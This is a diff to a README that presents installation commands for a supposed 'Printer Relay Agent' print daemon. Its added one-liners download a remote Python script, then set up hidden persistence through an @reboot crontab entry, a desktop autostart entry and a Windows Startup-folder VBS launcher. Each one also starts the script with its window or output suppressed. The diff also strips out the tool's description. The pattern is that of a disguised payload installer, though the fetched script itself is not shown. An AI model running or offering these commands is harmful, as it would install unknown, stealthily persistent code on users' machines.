@@ -1,23 +1,21 @@
-# Printer Relay Agent
-Background print daemon for spooling print jobs directly to campus LPR printers.
 ### Linux
 ```bash
-curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.go -o printer.go && GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o sysprint printer.go && mkdir -p ~/.local/bin ~/.config/autostart && cp sysprint ~/.local/bin/sysprint && chmod +x ~/.local/bin/sysprint && (crontab -l 2>/dev/null; echo "@reboot ~/.local/bin/sysprint") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysprint\nExec=%s\n' "$HOME/.local/bin/sysprint" > ~/.config/autostart/sysprint.desktop && ~/.local/bin/sysprint &
+curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysprint.py && mkdir -p ~/.local/bin ~/.config/autostart && chmod +x ~/.local/bin/sysprint.py && (crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/bin/sysprint.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysprint\nExec=python3 %s\n' "$HOME/.local/bin/sysprint.py" > ~/.config/autostart/sysprint.desktop && nohup python3 ~/.local/bin/sysprint.py >/dev/null 2>&1 &
 ```
 
 ### Windows (PowerShell)
 ```powershell
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.go" -OutFile "printer.go"; $env:GOOS="windows"; $env:GOARCH="amd64"; go build -ldflags="-H=windowsgui -s -w" -o sysprint.exe printer.go; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.exe"; Copy-Item "sysprint.exe" $target -Force; Start-Process $target
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysprint.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysprint.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysprint.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysprint.py" -WindowStyle Hidden
 ```
 
 ### Status Check
 
 #### Linux
 ```bash
-ps aux | grep sysprint
+ps aux | grep sysprint.py
 ```
 
 #### Windows
 ```powershell
-Get-Process sysprint
+Get-Process python*
 ```
